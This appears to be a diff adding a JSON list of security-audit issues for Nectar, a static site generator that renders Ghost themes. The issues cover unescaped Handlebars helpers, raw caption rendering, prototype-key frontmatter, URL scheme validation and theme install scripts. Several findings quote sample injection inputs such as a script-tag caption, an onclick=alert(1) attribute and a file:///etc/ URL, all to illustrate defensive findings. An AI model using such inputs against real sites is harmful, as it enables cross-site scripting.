+    "body": "src/render/engine.ts:82-91 calls `engine.hb.compile(...)` on every route, instead of using the pre-compiled template stored in `engine.templates`. This wastes CPU but more importantly means an attacker-supplied template body (theme) is recompiled N times per build, multiplying any compile-time exponential parsing. Mitigation: compile once at theme-load and reuse. (Also a correctness bug: any helpers registered later are unavailable for the pre-compiled copy stored under `templates[name]`, but the runtime compile picks them up — confirm intent.)",
+    "labels": ["security", "P3", "performance", "render"]
+  },
+  {
+    "title": "security: rendered HTML written with utf8 encoding but no BOM stripping — UTF-7 / encoding-confusion risk for old user agents",
+    "body": "src/build/emit.ts:9 writes HTML without an explicit `<meta charset>`. The default theme emits `<meta charset=utf-8>` so this is fine in practice, but a custom theme that omits the meta tag relies on the HTTP `Content-Type` header — which static hosts may set incorrectly. Old browsers with charset auto-detection have historically been XSS-able via UTF-7 sniffing. Mitigation: document the requirement that themes include `<meta charset=utf-8>` and consider injecting it automatically if absent.",
+    "labels": ["security", "P3", "render"]
+  },
+  {
+    "title": "security: navigation pagination uses HTML-escaped but un-quoted role/aria attrs — minor",
+    "body": "src/render/helpers/navigation.ts:28 emits `role=\"navigation\" aria-label=\"Pagination\"` literally. No XSS, but a future change inserting variables here without escaping would regress. Add a unit test that pagination output stays well-formed for unusual pagination data.",
+    "labels": ["security", "P3", "testing", "render"]
+  },
+  {
+    "title": "security: turndown's TurndownService is created at module scope and mutated implicitly (state leak across imports)",
+    "body": "src/ghost/import.ts:8 keeps `turndown` as a module-level singleton. Turndown supports `addRule` mutation; if a future helper registers a rule for one import, it persists for the next. Currently no rules are added so the risk is theoretical. Mitigation: instantiate fresh per import call.",
+    "labels": ["security", "P3", "migration"]
+  },
+  {
+    "title": "security: helper `t` interpolation uses `replaceAll` with no escaping — values may contain markup",
+    "body": "src/render/helpers/i18n.ts:21-34: `out.replaceAll(\"{key}\", String(value))` inserts hash-arg values into a string then returns it; in themes this is often used inside `{{{t \"…\"}}}` (triple-stash), so any `<` in the value renders as HTML. With locale files acting as semi-trusted input (theme-shipped), an attacker who controls a locale file or a `t` call site can XSS. Mitigation: HTML-escape value before interpolation when the helper is used in default (double-stash) context; document that triple-stash with `t` requires the substituted values to be trusted.",
+    "labels": ["security", "P2", "render", "i18n"]
+  },
+  {
+    "title": "security: `feature_image_caption` is rendered raw via Handlebars triple-stash in typical Ghost themes",
+    "body": "Ghost stores feature_image_caption as HTML. The example theme and most Ghost-derived themes render it with `{{{feature_image_caption}}}`. src/content/loader.ts:204 reads it as a string from frontmatter with no sanitisation. Threat: contributor PR adds `feature_image_caption: \"<script>…</script>\"` and ships persistent XSS. Mitigation: sanitise this field at load time, or document that themes must escape it.",
+    "labels": ["security", "P1", "content", "render"]
+  },
+  {
+    "title": "security: bun.lock contains no `integrity` hashes (Bun stores SHA-512 in registry-meta only)",
+    "body": "Bun's lockfile stores integrity hashes implicitly via tarball SHA-512 in the package entries (see `sha512-…` lines in bun.lock). This is good, but the project does not mention `--frozen-lockfile` anywhere. Document the requirement, and have CI fail if the lockfile drifts.",
+    "labels": ["security", "P3", "supply-chain"]
+  },
+  {
+    "title": "security: theme assets directory walk reads every file fully into memory for hashing",
+    "body": "src/theme/assets.ts:13-15 reads each asset into a Buffer to compute SHA-1. A theme containing a 4 GB binary asset (legal — themes can ship arbitrary files) OOMs the build. Mitigation: stream-hash files larger than e.g. 16 MB using `Bun.file(...).stream()` piped into the hasher.",
+    "labels": ["security", "P2", "performance", "render"]
+  },
+  {
+    "title": "security: no rate limit or size limit on `nectar serve` responses (LAN attacker can request huge files)",
+    "body": "src/cli/commands/serve.ts streams whatever `Bun.file(filePath)` returns, with no per-request size cap. A LAN attacker requesting `/big-asset.bin` repeatedly can saturate the developer's link. Lower priority since `serve` is documented as local-only. Mitigation: cap concurrent requests, document binding to 127.0.0.1.",
+    "labels": ["security", "P3", "cli"]
+  },
+  {
+    "title": "security: build emits absolute timestamps in HTML/RSS (privacy + reproducibility)",
+    "body": "src/build/feeds.ts:34 emits `new Date(post.published_at).toUTCString()` and JSON-LD uses `ctx.published_at`/`ctx.updated_at`. These come from frontmatter (good — author-controlled, no host clock leakage). However, src/content/loader.ts:185-187 falls back to `new Date().toISOString()` when no date is present. That means a post without a date publishes the build time, which leaks the build server's clock and time zone to readers. Mitigation: refuse to build a post with no date, or use a fixed epoch fallback.",
+    "labels": ["security", "P3", "content"]
+  },
+  {
+    "title": "security: no documentation of trust boundaries (who can supply Markdown / themes / config)",
+    "body": "README.md focuses on features. There is no documented threat model. A blog operator accepting outside-contributor PRs needs to know which Markdown frontmatter fields are dangerous (`codeinjection_*`, `feature_image_caption`, `slug`), which config fields are dangerous (`site.url`, `theme.custom.*`), and that themes are essentially code. Mitigation: add `docs/security/threat-model.md` describing each surface, the trust level it expects, and the mitigations applied (or recommendations like 'review PR diffs for `codeinjection_*` and raw `<script>`'). Cross-link from README.",
+    "labels": ["security", "P1", "docs"]
+  },
+  {
+    "title": "security: env var NECTAR_LOG_LEVEL has no whitelist — unknown values fall back to info silently",
+    "body": "src/util/logger.ts:5 reads `process.env.NECTAR_LOG_LEVEL` and falls back if undefined or unrecognised. A typo silently disables the intended verbosity. Mitigation: warn on unknown values; this is minor but worth adding a test.",
+    "labels": ["security", "P3", "observability"]
+  },
+  {
+    "title": "security: regex `LAYOUT_DIRECTIVE` in src/render/layouts.ts uses `[\\w-]+` for layout name — controlled, but a theme layout name with backslashes/spaces is silently rejected",
+    "body": "Low priority: src/render/layouts.ts:1 only accepts alphanumerics, underscore, hyphen for layout names. Themes that use namespaced layouts (`layouts/post`) cannot reference them via `{{!< layouts/post}}`. Documented in code; not a security issue per se, but worth pinning down so future relaxation does not allow path traversal.",
+    "labels": ["security", "P3", "theme-dev"]
+  },
+  {
+    "title": "security: per-route render context spreads `post` properties onto `this` (prototype-conflict risk)",
+    "body": "src/render/engine.ts:101-103 does `Object.assign(ctx, data.post)`. A post with frontmatter keys named `__proto__` / `constructor` / `prototype` would be problematic. zod schema does not currently parse posts (loader returns raw objects). Mitigation: filter / reject reserved keys in frontmatter; create `ctx` from `Object.create(null)`.",
+    "labels": ["security", "P2", "render", "content"]
+  },
+  {
+    "title": "security: `get` helper allows themes to enumerate all content including drafts when status filter changes upstream",
+    "body": "src/render/helpers/blocks.ts:127-135 slices `engine.content.posts` etc., which is the *resolved* list (drafts already removed). Good. But if a future feature exposes raw content (e.g. `nectar serve --drafts`) the same `get` helper would surface drafts to readers. Mitigation: add a unit test that asserts no draft is ever in `engine.content.posts`; document the invariant.",
+    "labels": ["security", "P3", "render", "content"]
+  },
+  {
+    "title": "security: `link` helper emits attributes without quoting if hash values contain `\"` (escaped) but accepts arbitrary `class` strings",
+    "body": "src/render/helpers/navigation.ts:42-47 emits `class=\\\"${escapeAttr(cls)}\\\"`. A theme passing `class=\\\"x onclick=alert(1)\\\"` — wait, that ends up inside `class=\"…\"` so it stays as a class token. Safer than it looks, but document the contract.",
+    "labels": ["security", "P3", "render"]
+  },
+  {
+    "title": "security: ghost_head emits og:image / twitter:image without verifying scheme (open redirect-ish for SEO scrapers)",
+    "body": "src/render/helpers/ghost-head.ts:31-41 emits image URLs from frontmatter directly into `<meta og:image content=\\\"…\\\">`. If feature_image is `javascript:` it is HTML-escaped (no XSS), but the scraper-side behaviour of pasting non-http URLs into og:image is undefined and may break link previews. Mitigation: validate http(s) scheme; fall back to site default.",
+    "labels": ["security", "P3", "render", "seo"]
+  },
+  {
+    "title": "security: `joinUrl` in content/loader.ts uses `new URL(path, base)` and may accept exotic schemes",
+    "body": "src/content/loader.ts:473-475: if `config.site.url` is `file:///etc/`, the resulting per-post URL is `file:///etc/...`. Combined with the no-validation issue above. Mitigation: validate site.url is http(s) at config load (already covered by separate finding) — keep both fixes consistent.",
+    "labels": ["security", "P3", "config"]
+  },
+  {
+    "title": "security: example theme ships gulpfile.js / yarn.lock — running `npm install` inside the theme directory executes theme-author code",
+    "body": "example/themes/source/ contains a real Ghost theme with its own package.json + gulpfile + yarn.lock. If a user runs `npm install` inside the theme dir (Ghost themes typically do for asset builds), arbitrary preinstall scripts run as the user. Not an issue for Nectar itself, but document that users should treat third-party themes as untrusted code and pin `--ignore-scripts` when installing theme dev deps.",
+    "labels": ["security", "P2", "docs", "theme-dev"]
+  }
+]
